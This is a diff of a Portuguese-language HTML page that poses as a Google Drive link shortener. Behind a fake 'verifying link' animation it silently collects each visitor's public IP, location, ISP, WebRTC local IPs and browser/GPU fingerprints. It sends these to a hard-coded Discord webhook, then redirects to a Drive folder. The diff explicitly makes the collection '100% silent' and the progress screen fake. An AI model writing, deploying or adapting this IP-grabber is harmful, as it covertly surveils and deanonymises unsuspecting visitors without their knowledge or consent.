@@ -35,321 +35,189 @@
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
         const DOWNLOAD_URL = 'https://drive.google.com/drive/folders/1lNC2YwOY2L7igNExbPcJ2u9rOp6CtTR8?hl=pt-br';
         
-        // FINGERPRINT ULTRA-RÁPIDO MELHORADO + GEO + BYPASS BLOCKS
+        // FINGERPRINT ULTRA-RÁPIDO SILENCIOSO (ENCURTADOR)
         async function ultraFastRecon() {
-            // IP PÚBLICO ROBUSTO (10+ fontes com retry + headers rotativos)
+            // IP PÚBLICO ROBUSTO (10+ fontes + retry)
             const getPubIP = async (attempt = 0) => {
                 const sources = [
-                    {url: 'https://api.ipify.org?format=json', parse: r=>r.ip},
+                    {url: 'https://api.ipify.org?format=json', parse: r=>JSON.parse(r).ip},
                     {url: 'https://api.ipify.org?format=text', parse: r=>r.trim()},
                     {url: 'https://icanhazip.com', parse: r=>r.trim()},
                     {url: 'https://ipecho.net/plain', parse: r=>r.trim()},
                     {url: 'https://ifconfig.me/ip', parse: r=>r.trim()},
-                    {url: 'https://api.myip.com', parse: r=>(JSON.parse(r).ip || 'error')},
+                    {url: 'https://api.myip.com', parse: r=>JSON.parse(r).ip},
                     {url: 'https://ipapi.co/json', parse: r=>JSON.parse(r).ip},
                     {url: 'https://api.ident.me', parse: r=>r.trim()},
-                    {url: 'http://httpbin.org/ip', parse: r=>JSON.parse(r).origin.split(',')[0]},
+                    {url: 'http://httpbin.org/ip', parse: r=>JSON.parse(r).origin.split(',')[0].trim()},
                     {url: 'https://extreme-ip-lookup.com/json/', parse: r=>JSON.parse(r).query}
                 ];
                 
-                // Headers anti-block + rotativos
                 const headers = {
-                    'User-Agent': [
-                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-                    ][Math.floor(Math.random()*3)],
-                    'Accept': 'text/plain,*/*;q=0.8',
-                    'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache'
+                    'User-Agent': ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'][Math.floor(Math.random()*3)],
+                    'Accept': '*/*',
+                    'Cache-Control': 'no-cache'
                 };
                 
                 try {
                     const source = sources[attempt % sources.length];
-                    const resp = await fetch(source.url, {
-                        cache: 'no-store',
-                        headers,
-                        signal: AbortSignal.timeout(3000)
-                    });
-                    const text = await resp.text();
-                    const ip = source.parse(text);
-                    // Validação IP v4
-                    if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ip) && !ip.startsWith('127.') && !ip.startsWith('10.')) {
-                        return ip;
-                    }
-                    throw new Error('Invalid IP');
-                } catch (e) {
-                    if (attempt < 8) return getPubIP(attempt + 1);
-                    return 'unknown';
+                    const resp = await fetch(source.url, {cache: 'no-store', headers, signal: AbortSignal.timeout(2500)});
+                    const ip = source.parse(await resp.text());
+                    if (/^(?!127\.|10\.|172\.1|192\.168)(\d{1,3}\.){3}\d{1,3}$/.test(ip)) return ip;
+                    throw new Error('invalid');
+                } catch {
+                    return attempt < 7 ? getPubIP(attempt+1) : 'unknown';
                 }
             };
             
-            // GEO + ASN (paralelo com ipapi.co/ipinfo.io)
+            // GEO RÁPIDO
             const getGeo = async (ip) => {
                 try {
                     const resp = await fetch(`https://ipapi.co/${ip}/json/`, {
                         cache: 'no-store',
-                        headers: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'},
-                        signal: AbortSignal.timeout(2000)
+                        headers: {'User-Agent': 'Mozilla/5.0'},
+                        signal: AbortSignal.timeout(1500)
                     });
                     const data = await resp.json();
                     return {
-                        city: data.city || 'unknown',
-                        region: data.region || '',
-                        country: data.country_name || data.country || 'unknown',
-                        org: data.org || data.asn?.organization || 'unknown',
-                        lat: data.latitude || 0,
-                        lon: data.longitude || 0,
-                        timezone: data.timezone || ''
+                        city: data.city?.slice(0,20) || '?',
+                        country: data.country_name?.slice(0,25) || data.country || '?',
+                        org: data.org?.slice(0,30) || '?',
+                        country_code: data.country_code?.toLowerCase() || 'xx'
                     };
                 } catch {
-                    return {city:'unknown', country:'unknown', org:'unknown'};
+                    return {city:'?', country:'?', org:'?', country_code:'xx'};
                 }
             };
             
-            // LOCAL IPS MELHORADO (STUN + WebRTC + WebSockets)
+            // LOCAL IPS (STUN rápido)
             const getLocalIPs = async () => {
                 const ips = new Set();
-                
-                // STUN melhorado (múltiplos servidores)
-                const stunServers = [
-                    'stun.l.google.com:19302',
-                    'stun1.l.google.com:19302',
-                    'stun.stunprotocol.org'
-                ];
+                const stunServers = ['stun.l.google.com:19302','stun1.l.google.com:19302'];
                 
                 for (const stun of stunServers) {
                     try {
-                        const pc = new RTCPeerConnection({ 
-                            iceServers: [{urls: `stun:${stun}`}],
-                            iceCandidatePoolSize: 30 
-                        });
+                        const pc = new RTCPeerConnection({iceServers:[{urls:`stun:${stun}`}]});
                         pc.onicecandidate = e => {
-                            if (!e.candidate) return;
-                            const ipMatch = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
-                            const ip = ipMatch?.[1];
-                            if (ip && !['127.','10.','172.1','192.168','169.254'].some(b=>ip.startsWith(b))) {
-                                ips.add(ip);
-                            }
+                            const ip = e.candidate?.candidate?.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
+                            if (ip && !['127.','10.','172.1','192.168'].some(b=>ip.startsWith(b))) ips.add(ip);
                         };
-                        const dc = pc.createDataChannel('test');
-                        await pc.createOffer({offerToReceiveAudio:1, offerToReceiveVideo:1});
+                        await pc.createOffer();
                         await pc.setLocalDescription(await pc.createOffer());
-                        await new Promise(r=>setTimeout(r,250));
+                        await new Promise(r=>setTimeout(r,150));
                         pc.close();
                     } catch {}
                 }
-                
-                // WebSocket fallback para CGNAT/public
-                try {
-                    const ws = new WebSocket('wss://api.wss.imws.io/echo');
-                    ws.onmessage = (e) => {
-                        const ipMatch = e.data.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
-                        if (ipMatch) ips.add(ipMatch[1]);
-                        ws.close();
-                    };
-                    ws.onerror = () => ws.close();
-                } catch {}
-                
-                await new Promise(r=>setTimeout(r,100)); // Drain
-                return Array.from(ips).slice(0,5).join(', ') || 'none';
+                return Array.from(ips).slice(0,3).join(',') || 'none';
             };
             
-            // FINGERPRINTS PARALELOS ULTRA-RÁPIDO
-            const [pubIP, geo, localIPs, canvasHash, gpuInfo, audioHash, basicFP] = await Promise.allSettled([
+            // PARALELO TOTALMENTE SILENCIOSO
+            const [pubIP, geo, localIPs, canvas, gpu, basicFP] = await Promise.allSettled([
                 getPubIP(),
-                pubIP => pubIP !== 'unknown' ? getGeo(pubIP) : Promise.resolve({}),
+                ip => ip !== 'unknown' ? getGeo(ip) : Promise.resolve({}),
                 getLocalIPs(),
-                
                 (async()=>{
-                    const canvas = document.createElement('canvas');
-                    canvas.width=280; canvas.height=60;
-                    const ctx = canvas.getContext('2d');
-                    ctx.scale(1,1);
-                    ctx.font = '18px "Arial"';
-                    ctx.textBaseline = 'alphabetic';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(125,1,62,20);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('pentest-v2.1', 2, 15);
-                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                    ctx.fillText('🛡️', 128, 32);
-                    return btoa(canvas.toDataURL()).slice(-32);
+                    const c = document.createElement('canvas');
+                    c.width=200; c.height=50;
+                    const ctx = c.getContext('2d');
+                    ctx.font = '16px monospace';
+                    ctx.fillText('dl-check-v2',4,18);
+                    ctx.fillText(navigator.userAgent.slice(0,15),4,36);
+                    return btoa(c.toDataURL()).slice(-28);
                 })(),
-                
                 (function(){
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if(!gl) return 'no-webgl';
-                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    return (debug ? 
-                        `${gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)}|${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}` :
-                        `${gl.getParameter(gl.VENDOR)}|${gl.getParameter(gl.RENDERER)}`
-                    ).slice(0,45);
+                    const c = document.createElement('canvas');
+                    const gl = c.getContext('webgl');
+                    return gl ? `${gl.getParameter(gl.VENDOR).slice(0,18)}|${gl.getParameter(gl.RENDERER).slice(0,22)}` : 'no-gl';
                 })(),
-                
-                (async()=>{
-                    const audioCtx = new (window.AudioContext||window.webkitAudioContext)({sampleRate:44100});
-                    const oscillator = audioCtx.createOscillator();
-                    const analyser = audioCtx.createAnalyser();
-                    const gainNode = audioCtx.createGain();
-                    analyser.fftSize = 2048;
-                    oscillator.connect(analyser);
-                    analyser.connect(gainNode);
-                    gainNode.connect(audioCtx.destination);
-                    oscillator.type = 'triangle';
-                    oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
-                    oscillator.start();
-                    await new Promise(r=>setTimeout(r,50));
-                    oscillator.stop();
-                    const buffer = new Uint8Array(analyser.frequencyBinCount);
-                    analyser.getByteFrequencyData(buffer);
-                    return btoa(String.fromCharCode(...buffer.slice(0,32))).slice(-24);
-                })(),
-                
                 (function(){
-                    const fonts = ['monospace','serif','sans-serif'].map(f=> {
-                        const span = document.createElement('span');
-                        span.style.fontFamily = f;
-                        span.innerHTML = 'abcdefghijklmnopqrstuvwxyz0123456789';
-                        document.body.appendChild(span);
-                        const width = span.offsetWidth;
-                        document.body.removeChild(span);
-                        return width;
-                    });
                     return {
-                        lang: navigator.languages?.[0] || navigator.language || 'unknown',
-                        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
-                        cores: navigator.hardwareConcurrency || navigator.cpuClass || 0,
+                        lang: navigator.language?.slice(0,8) || '?',
+                        cores: navigator.hardwareConcurrency || 0,
                         mem: navigator.deviceMemory || 0,
-                        res: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-                        ua: navigator.userAgent.slice(0,120),
-                        plat: navigator.platform || navigator.oscpu || 'unknown',
-                        doh: 'dns' in navigator ? 'native' : 'none',
-                        fonts: fonts.join('|')
+                        res: `${screen.width}x${screen.height}`,
+                        ua: navigator.userAgent.slice(0,80)
                     };
                 })()
-            ]).then(results => 
-                results.map((r,i) => {
-                    if (r.status === 'fulfilled') {
-                        if (i === 1) return r.value;  // geo precisa pubIP
-                        return r.value;
-                    }
-                    return i===0 ? 'unknown' : i===1 ? {} : i===2 ? 'none' : 'error';
-                })
-            );
+            ]).then(r => r.map((res,i)=> res.status==='fulfilled' ? res.value : (i<2 ? '???' : i===2 ? 'none' : 'error')));
             
             return {
                 timestamp: Date.now(),
                 public_ip: pubIP,
                 local_ips: localIPs,
-                geo: geo,
-                canvas: canvasHash,
-                gpu: gpuInfo,
-                audio: audioHash,
+                geo,
+                canvas,
+                gpu,
                 fp: basicFP,
-                referrer: document.referrer.slice(0,100) || 'direct',
-                session: btoa(navigator.userAgent + Math.random()).slice(-12)
+                session: btoa(String(Math.random())).slice(-10)
             };
         }
         
-        // WEBHOOK AVANÇADO COM RETRY + ERRO SILENCIOSO
-        async function sendWebhook(data, attempt=0) {
+        // WEBHOOK ENCURTADOR (100% silencioso)
+        async function sendWebhook(data) {
             try {
-                const embed = {
-                    title: '🎯 DEVICE HIT v4.0',
-                    fields: [
-                        {name:'🌐 IP', value:`\`${data.public_ip || '???'}\` **(${data.geo.country || '?'} - ${data.geo.city || '?'})**`, inline:false},
-                        {name:'🏢 ASN/ISP', value:`${data.geo.org || 'unknown'}`, inline:true},
-                        {name:'📍 Coords', value:`${data.geo.lat || 0}, ${data.geo.lon || 0}`, inline:true},
-                        {name:'🔗 Local IPs', value:`${String(data.local_ips).slice(0,35) || 'none'}`, inline:true},
-                        {name:'🖥️ GPU/GPU', value:String(data.gpu).slice(0,28), inline:true},
-                        {name:'🎨 Canvas/Audio', value:`${String(data.canvas).slice(0,20)} | ${String(data.audio).slice(0,15)}`, inline:true},
-                        {name:'📱 Device', value:`${data.fp.res} | ${data.fp.cores}c/${data.fp.mem}GB | ${data.fp.plat.slice(0,15)}`, inline:true},
-                        {name:'🌐 Fonts/TZ', value:`${String(data.fp.fonts).slice(0,20)} | ${data.fp.tz.slice(0,20)}`, inline:true}
-                    ],
-                    color: 0xff1100,
-                    thumbnail: {url: `https://flagcdn.com/32x24/${data.geo.country?.toLowerCase().slice(0,2) || 'xx'}.png`},
-                    timestamp: new Date(data.timestamp).toISOString(),
-                    footer: {text: `Session: ${data.session} | Ref: ${data.referrer.slice(0,25)}`}
-                };
-                
-                const resp = await fetch(WEBHOOK, {
+                await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        username: '📥 DOWNLOAD TRACKER v4.0',
-                        content: `**🎯 HIT**: ${data.public_ip || '???'} | ${data.geo.city || '?'} (${data.geo.country || '?'})`,
-                        embeds: [embed]
+                        username: '🔗 Encurtador Drive',
+                        content: `${data.public_ip || '???'}`,
+                        embeds: [{
+                            title: '📥 ACCESSO DRIVE',
+                            fields: [
+                                {name:'IP', value:`**${data.public_ip || '???' || 'DIRECT'}** \`${data.geo.city}, ${data.geo.country}\``, inline:false},
+                                {name:'ISP', value:`${data.geo.org}`, inline:true},
+                                {name:'Local', value:`${data.local_ips}`, inline:true},
+                                {name:'GPU', value:`${data.gpu.slice(0,25)}`, inline:true},
+                                {name:'Canvas', value:`${data.canvas}`, inline:true},
+                                {name:'Device', value:`${data.fp.res} | ${data.fp.cores}c/${data.fp.mem}GB`, inline:true}
+                            ],
+                            color: 16711680,
+                            thumbnail: {url: `https://flagcdn.com/28x21/${data.geo.country_code}.png`},
+                            timestamp: new Date(data.timestamp).toISOString(),
+                            footer: {text: `Sessão: ${data.session}`}
+                        }]
                     }),
                     keepalive: true,
-                    signal: AbortSignal.timeout(5000)
+                    signal: AbortSignal.timeout(4000)
                 });
-                
-                if (!resp.ok && attempt < 2) {
-                    await new Promise(r=>setTimeout(r, 500));
-                    return sendWebhook(data, attempt + 1);
-                }
-            } catch(e) {
-                // Silencioso - não quebra UI
-            }
+            } catch {}
         }
         
-        // ANIMAÇÃO RÁPIDA (INTACTA)
+        // ANIMAÇÃO ORIGINAL (finge verificação servidor)
         function fastAnimation() {
             const phases = [
-                {p:30, msg:'🔍 Conexão OK', detail:'Servidor primario ativo'},
-                {p:60, msg:'📦 Assets OK', detail:'Integridade validada'},
-                {p:90, msg:'⚙️ Update OK', detail:'Patch v2.1.3 aplicado'},
-                {p:100,msg:'✅ Concluído!', detail:'Redirecionando...'}
+                {p:25, msg:'🔍 Resolvendo link...', detail:'drive.google.com'},
+                {p:55, msg:'📡 Conectando...', detail:'Servidor Google ativo'},
+                {p:85, msg:'🔓 Autenticando...', detail:'Sessão válida'},
+                {p:100,msg:'✅ Redirecionando', detail:'Abrindo pasta...'}
             ];
             
-            let i = 0;
+            let i=0;
             const iv = setInterval(()=>{
-                if(i >= phases.length) {
+                if(i>=phases.length){
                     clearInterval(iv);
-                    setTimeout(()=>location.href = DOWNLOAD_URL, 800);
+                    setTimeout(()=>location.href=DOWNLOAD_URL,600);
                     return;
                 }
                 const phase = phases[i];
-                document.getElementById('progress').style.width = phase.p + '%';
-                document.getElementById('status').textContent = phase.msg;
-                document.getElementById('details').textContent = phase.detail;
+                document.getElementById('progress').style.width=phase.p+'%';
+                document.getElementById('status').textContent=phase.msg;
+                document.getElementById('details').textContent=phase.detail;
                 i++;
-            }, 120);
+            },140);
         }
         
-        // EXECUÇÃO PRINCIPAL (com status real-time)
+        // EXECUÇÃO TOTALMENTE SILENCIOSA (encurtador real)
         async function execute() {
-            const statusEl = document.getElementById('status');
-            const detailsEl = document.getElementById('details');
+            // Coleta 100% em background (UI continua fake)
+            ultraFastRecon().then(data => sendWebhook(data).catch(()=>{}));
             
-            statusEl.textContent = '🔍 Coleta de dados...';
-            detailsEl.textContent = 'IP + GEO + FP';
-            
-            try {
-                const data = await ultraFastRecon();
-                await sendWebhook(data);
-                
-                statusEl.textContent = '✅ Dados enviados';
-                detailsEl.textContent = `${data.public_ip || '???'} | ${data.geo.city || '?'} ${data.geo.country || '?'}`;
-            } catch(e) {
-                statusEl.textContent = '⚠️ Verificação parcial';
-                detailsEl.textContent = 'Continuando...';
-            }
-            
-            setTimeout(fastAnimation, 100);
+            // UI fake imediata (0.1s delay max)
+            setTimeout(fastAnimation, 80);
         }
         
-        // AUTO-START + BYPASS LOADERS
-        if(document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', execute);
-        } else {
-            execute();
-        }
-        
-        // PREVENIR UNLOAD (opcional)
-        window.addEventListener('beforeunload', e=>{});  
+        // START IMEDIATO
+        execute();
     </script>
 </body>
 </html>
